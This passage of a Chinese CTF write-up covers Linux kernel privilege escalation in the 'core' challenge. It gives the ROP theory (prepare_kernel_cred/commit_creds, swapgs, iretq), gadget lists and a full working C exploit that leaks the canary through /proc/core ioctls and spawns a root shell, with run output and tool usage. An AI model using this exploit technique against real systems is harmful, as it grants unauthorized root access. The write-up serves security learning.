.text:FFFFFFFF81000000
.text:FFFFFFFF81000000 ; Segment type: Pure code
.text:FFFFFFFF81000000 ; Segment permissions: Read/Execute
.text:FFFFFFFF81000000 _text           segment mempage public 'CODE' use64
.text:FFFFFFFF81000000                 assume cs:_text
.text:FFFFFFFF81000000                 ;org 0FFFFFFFF81000000h
.text:FFFFFFFF81000000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:FFFFFFFF81000000
.text:FFFFFFFF81000000 ; =============== S U B R O U T I N E =======================================
.text:FFFFFFFF81000000
.text:FFFFFFFF81000000
.text:FFFFFFFF81000000 sub_FFFFFFFF81000000 proc near          ; DATA XREF: sub_FFFFFFFF81000000+C↓o
.text:FFFFFFFF81000000                                         ; sub_FFFFFFFF810001F0+3D↓o ...
.text:FFFFFFFF81000000                 lea     rsp, unk_FFFFFFFF82203F58
.text:FFFFFFFF81000007                 call    sub_FFFFFFFF810000E0
.text:FFFFFFFF8100000C                 lea     rdi, sub_FFFFFFFF81000000
.text:FFFFFFFF81000013                 push    rsi
.text:FFFFFFFF81000014                 call    sub_FFFFFFFF810001F0
.text:FFFFFFFF81000019                 pop     rsi
.text:FFFFFFFF8100001A                 add     rax, 2682000h
.text:FFFFFFFF81000020                 jmp     short loc_FFFFFFFF81000042
.text:FFFFFFFF81000020 ; ---------------------------------------------------------------------------
```

因此如果rop gadget的内存地址，可以通过如下的方式获取：

> kernel_base = commit_cred_addr-commit_cred_offset
> 
> gadget_addr_offset = （gadget_addr_offline-0xFFFFFFFF81000000）
> 
> gadget_addr =  kernel_base+gadget_addr_offset



攻击思路如下：

* 将0 赋值到rdi

* 触发ret执行prepare_kernel_cred，其返回值存放在寄存器rax中

* 将rax覆盖rdi

* 触发ret执行commit_creds函数

* 为例执行用户空间代码，需要执行swappgs（我的理解)

* 通过iret返回，因为是从kernel返回到用户态，因此需要在栈上布局return_addr,cs,flag,sp,ss。

Note1:

```textile
the IRET instruction pops the return instruction pointer, 
return code segment selector, and EFLAGS image from the stack to the EIP,
 CS, and EFLAGS registers, respectively, and then resumes execution of 
the interrupted program or procedure. If the return is to 
another privilege level, the IRET instruction also pops the 
stack pointer and SS from the stack, before resuming program execution.
```

Note2:

```textile
When FS and GS segment overrides are used in 64-bit mode, their 
respective base addresses are used in the linear
address calculation: (FS or GS).base + index + displacement. 
FS.base and GS.base are then expanded to the full
linear-address size supported by the implementation. The resulting 
effective address calculation can wrap across
positive and negative addresses; the resulting linear address must be 
canonical.

1）The SWAPGS instruction is available only in 64-bit mode. It swaps the 
contents of two specific MSRs (IA32_GS_BASE and IA32_KERNEL_GS_BASE).
2）The IA32_GS_BASE MSR shadows the base address portion of the GS 
descriptor register; the IA32_KERNEL_GS_BASE MSR holds the base address 
of the GS segment used by the kernel (typically it houses kernel 
structures).
3）SWAPGS is intended for use with fast system calls when in 64-bit 
mode to allow immediate access to kernel structures on transition to 
kernel mode.

```

### 4.2 rop gadgets

prepare_kernel_cred函数需要的gadget:

> 0xffffffff81000b2f : pop rdi ; ret

commit_cred函数的准备参数的gadget很多，如

```asm
0xffffffff81424f1e : pop rbx ; pop rbp ; mov rdi, rax ; jmp rdx

0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx
0xffffffff81735dbf : pop r14 ; pop r15 ; mov rdi, rax ; jmp rdx
0xffffffff8123967a : mov rsi, rdi ; mov rdi, rax ; jmp r8
0xffffffff811ae975 : mov rsi, rdi ; mov rdi, rax ; jmp rcx
0xffffffff813c3384 : mov rsi, rdi ; mov rdi, rax ; jmp rdx

0xffffffff816c5d21 : mov rsi, rbx ; mov rdi, rax ; call rcx
0xffffffff81641dba : mov rsi, rbx ; mov rdi, rax ; call rdx

0xffffffff811ae978 : mov rdi, rax ; jmp rcx
0xffffffff8106a6d2 : mov rdi, rax ; jmp rdx
```

我们选择：

> 0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx
> 
> 0xffffffff810a0f49 : pop rdx ; ret



rop如下：

```c
void build_rop(unsigned long long canary)
{
    unsigned long long commit_cred_offset = 0x9c8e0; // 0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0 get from kallsyms
    unsigned long long kernel_base_addr = commit_cred_addr - commit_cred_offset;

#define vmlinux_offset(x) (x - 0xffffffff81000000)

    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;
    name_payload[10] = kernel_base_addr + vmlinux_offset(0xffffffff81000b2f); // 0xffffffff81000b2f : pop rdi ; ret
    name_payload[11] = 0;//rdi=0 after pop rid
    name_payload[12] = prepare_kernel_cred_addr;//ret will triger to excute this function
    name_payload[13] = kernel_base_addr + vmlinux_offset(0xffffffff810a0f49);//ret-addr of prepare_kernel_cred_addr,0xffffffff810a0f49 : pop rdx ; ret;
    name_payload[14] = commit_cred_addr;//we put commit_cred_addr into rdx, after move rdi,rax, then call rdx or jmp rdx
    name_payload[15] = kernel_base_addr + vmlinux_offset(0xffffffff81735dc1);//0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx
    name_payload[16] = 0x90;//this is for pop r15, we don't care
    name_payload[17] = kernel_base_addr + vmlinux_offset(0xffffffff81a012da);//return from commit_cred_addr, we are in root state: 0xffffffff81a012da : swapgs ; popfq ; ret
    name_payload[18] = 0x90;//this is for popfq, we don't care
    name_payload[19] = kernel_base_addr + vmlinux_offset(0xffffffff81050ac2);//0xffffffff81050ac2: iretq; ret;
    name_payload[20] = &get_shell;//return_addr rip for iretq
    name_payload[21] = user_cs; //code seg for iretq
    name_payload[22] = user_flag;//flag register for iretq
    name_payload[23] = user_rsp;//rsp  for iretq
    name_payload[24] = user_ss;//stack seg for iretq
}
```

获得cs、ss，flag和rsp的脚本如下：

```c
void save_status()
{
    // pushf-->push flag into stack
    // then use pop user_flag to get current flag
    asm("mov %%cs,%0":"=r"(user_cs));
    asm("mov %%ss,%0":"=r"(user_ss));
    asm("mov %%rsp,%0":"=r"(user_rsp));
    asm("pushf\n"
        "pop %0"
        :"=r"(user_flag)    
    );

    printf("user_cs:0x%016llx\n", user_cs);
    printf("user_ss:0x%016llx\n", user_ss);
    printf("user_rsp:0x%016llx\n", user_rsp);
    printf("user_flag:0x%016llx\n", user_flag);
}

```



### 4.3.执行结果



完整的pop如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

unsigned long long commit_cred_addr;
unsigned long long prepare_kernel_cred_addr;
unsigned long long ret_addr;
unsigned long long user_cs, user_ss, user_rsp, user_flag;
unsigned long long name_payload[25];

void get_shell()
{
    system("/bin/sh");
}
void build_rop(unsigned long long canary)
{
    unsigned long long commit_cred_offset = 0x9c8e0; // 0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0 get from kallsyms
    unsigned long long kernel_base_addr = commit_cred_addr - commit_cred_offset;

#define vmlinux_offset(x) (x - 0xffffffff81000000)

    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;
    name_payload[10] = kernel_base_addr + vmlinux_offset(0xffffffff81000b2f); // 0xffffffff81000b2f : pop rdi ; ret
    name_payload[11] = 0;//rdi=0 after pop rid
    name_payload[12] = prepare_kernel_cred_addr;//ret will triger to excute this function
    name_payload[13] = kernel_base_addr + vmlinux_offset(0xffffffff810a0f49);//ret-addr of prepare_kernel_cred_addr,0xffffffff810a0f49 : pop rdx ; ret;
    name_payload[14] = commit_cred_addr;//we put commit_cred_addr into rdx, after move rdi,rax, then call rdx or jmp rdx
    name_payload[15] = kernel_base_addr + vmlinux_offset(0xffffffff81735dc1);//0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx
    name_payload[16] = 0x90;//this is for pop r15, we don't care
    name_payload[17] = kernel_base_addr + vmlinux_offset(0xffffffff81a012da);//return from commit_cred_addr, we are in root state: 0xffffffff81a012da : swapgs ; popfq ; ret
    name_payload[18] = 0x90;//this is for popfq, we don't care
    name_payload[19] = kernel_base_addr + vmlinux_offset(0xffffffff81050ac2);//0xffffffff81050ac2: iretq; ret;
    name_payload[20] = &get_shell;//return_addr rip for iretq
    name_payload[21] = user_cs; //code seg for iretq
    name_payload[22] = user_flag;//flag register for iretq
    name_payload[23] = user_rsp;//rsp  for iretq
    name_payload[24] = user_ss;//stack seg for iretq
}

void save_status()
{
    // pushf-->push flag into stack
    // then use pop user_flag to get current flag
    asm("mov %%cs,%0":"=r"(user_cs));
    asm("mov %%ss,%0":"=r"(user_ss));
    asm("mov %%rsp,%0":"=r"(user_rsp));
    asm("pushf\n"
        "pop %0"
        :"=r"(user_flag)    
    );

    printf("user_cs:0x%016llx\n", user_cs);
    printf("user_ss:0x%016llx\n", user_ss);
    printf("user_rsp:0x%016llx\n", user_rsp);
    printf("user_flag:0x%016llx\n", user_flag);
}

unsigned long long get_kernel_func_addr(char *cmd)
{
    char buf[64];
    memset(buf, 0, sizeof(buf));
    FILE *fp = popen(cmd, "r");
    fgets(buf, sizeof(buf), fp);
    return strtoul(buf, NULL, 16);
}
unsigned long long get_commit_cred_addr()
{
    char *cmd = "cat /tmp/kallsyms |grep commit_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}
unsigned long long get_prepare_kernel_cred_addr()
{
    char *cmd = "cat /tmp/kallsyms |grep prepare_kernel_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}

int main(int argc, char **argv)
{
    int fd = open("/proc/core", O_RDWR);
    unsigned long long buf[64];

    unsigned int off_set_cmd = 0x6677889C;
    unsigned int read_cmd = 0x6677889B;
    unsigned int core_copy_func_cmd = 0x6677889A;

    // first setting off = 64
    int off = 64;
    ioctl(fd, off_set_cmd, 64);

    // call read to leak canary
    ioctl(fd, read_cmd, buf);

    for (int i = 0; i < 64; i++)
    {
        printf("%016llx ", buf[i]);
    }
    printf("\n");
    unsigned long long canary = buf[0];
    ret_addr = buf[2];
    printf("get canay is:%016llx\n", canary);

    // set commit_cred and prepare_kernel_cred address
    commit_cred_addr = get_commit_cred_addr();
    prepare_kernel_cred_addr = get_prepare_kernel_cred_addr();
    printf("commit_cred:%016llx\n", commit_cred_addr);
    printf("prepare_kernel_cred:%016llx\n", prepare_kernel_cred_addr);
    printf("sizeof name_payload:%d\n",sizeof(name_payload));

    //use rop to get root shell
    save_status();
    build_rop(canary);
    // set name
    
    write(fd, name_payload, sizeof(name_payload));

    // triger stack mash and excute shellcode to promote to root
    long long len = -65336;//unsinged short len ==200=8*25 which is size of name_payload
    ioctl(fd, core_copy_func_cmd, len);

    return 0;
}

```



执行结果如下：

```bash
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$ ./start3.sh 


SeaBIOS (version 1.13.0-1ubuntu1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+1FF8C8B0+1FECC8B0 CA00
                                                                               


Booting from ROM...


[    0.043542] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending select for 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ ./exp_3 
a43af88a5e527900 00007ffcad163290 ffffffffc007619b ffffa242d7f50900 ffffffff83ddd6d1 000000000000889b ffffa242d7f4f000 ffffffff83d8ecfa 0000000000000026 0000000000000000 0000000000000000 
get canay is:a43af88a5e527900
commit_cred:ffffffff83c9c8e0
prepare_kernel_cred:ffffffff83c9cce0
sizeof name_payload:200
user_cs:0x0000000000000033
user_ss:0x000000000000002b
user_rsp:0x00007ffcad163240
user_flag:0x0000000000000206
/ # id
uid=0(root) gid=0(root)
/ # whoami
root
/ # 

```



### 4.4.工具使用：

提取vmlinux：

extract-vmlinux([linux/extract-vmlinux at master · torvalds/linux · GitHub](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux))

```bash
./extract-vmlinux.sh ./bzImage >vmlinux_out
```

ropper安装

```bash
 python -m pip install ropper
 python -m pip install keystone-engine
```

PS: 未安装keystone-engine，会导致报错 module 'keystone' has no attribute 'KS_ARCH_X86'



也可以使用ROPgadget获得gadget，但是获取的信息好像没办法识别iret

> ROPgadget --binary ./vmlinux_out > gadget.txt
> 
> ROPgadget --binary vmlinux_out --only "pop|ret" > gadget2.txt

其次使用ropper获得daget：

> ropper --file ./vmlinux_out --nocolor >gadget_ropper2.txt

ropper获得信息比较全：

```bash
ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$ cat gadget_ropper2.txt|grep iretq
0xffffffff81050aba: mov eax, cs; push rax; push -0x7efaf53c; iretq; ret; 
0xffffffff81050abd: push -0x7efaf53c; iretq; ret; 
0xffffffff81050abc: push rax; push -0x7efaf53c; iretq; ret; 
0xffffffff81050ac2: iretq; ret; 
0xffffffff81050ab9: pushfq; mov eax, cs; push rax; push -0x7efaf53c; iretq; ret; 

```

_Note:不确定上面的现象是不是普遍现象._



## 5. 遗留问题

* iret机制？（中断返回）

* swapgs的工作原理（交换了什么内容，影响什么）

* 为什么最后一定要通过iret来进行跳转？



## 6. 附录

intel跳转指令：

> intel的跳转指令，需要借助eflags状态：
> 
> JE ;等于则跳转
> JNE ;不等于则跳转
> JZ ;为 0 则跳转
> JNZ ;不为 0 则跳转
> JS ;为负则跳转
> JNS ;不为负则跳转
> JC ;进位则跳转
> JNC ;不进位则跳转
> JO ;溢出则跳转
> JNO ;不溢出则跳转
> JA ;⽆符号⼤于则跳转
> JNA ;⽆符号不⼤于则跳转
> JAE ;⽆符号⼤于等于则跳转
> JNAE ;⽆符号不⼤于等于则跳转
> JG ;有符号⼤于则跳转
> JNG ;有符号不⼤于则跳转
> JGE ;有符号⼤于等于则跳转
> JNGE ;有符号不⼤于等于则跳转
> 
> JB ;⽆符号⼩于则跳转
> JNB ;⽆符号不⼩于则跳转
> JBE ;⽆符号⼩于等于则跳转
> JNBE ;⽆符号不⼩于等于则跳转
> JL ;有符号⼩于则跳转
> JNL ;有符号不⼩于则跳转
> JLE ;有符号⼩于等于则跳转
> JNLE ;有符号不⼩于等于则跳转
> JP ;奇偶位置位则跳转
> JNP ;奇偶位清除则跳转
> JPE ;奇偶位相等则跳转
> JPO ;奇偶位不等则跳转


